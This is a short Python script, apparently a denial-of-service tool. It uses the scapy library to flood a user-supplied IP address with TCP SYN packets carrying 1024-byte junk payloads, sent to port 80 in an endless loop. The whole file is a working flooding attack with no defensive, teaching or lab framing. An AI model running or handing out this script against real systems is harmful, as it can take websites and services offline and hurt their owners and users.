import sys,os
from scapy.all import *
target=input("IP: ")
port=80
ip=IP(dst=target)
tcp=TCP(sport=RandShort(),dport=port,flags="S")
raw=Raw(b"X"*1024)
packets=ip/tcp/raw
try:
    try:
        print("(+)Flood Sending...")
        send(packets,loop=1,verbose=0)
    except KeyboardInterrupt:
        pass
except Exception:
    pass
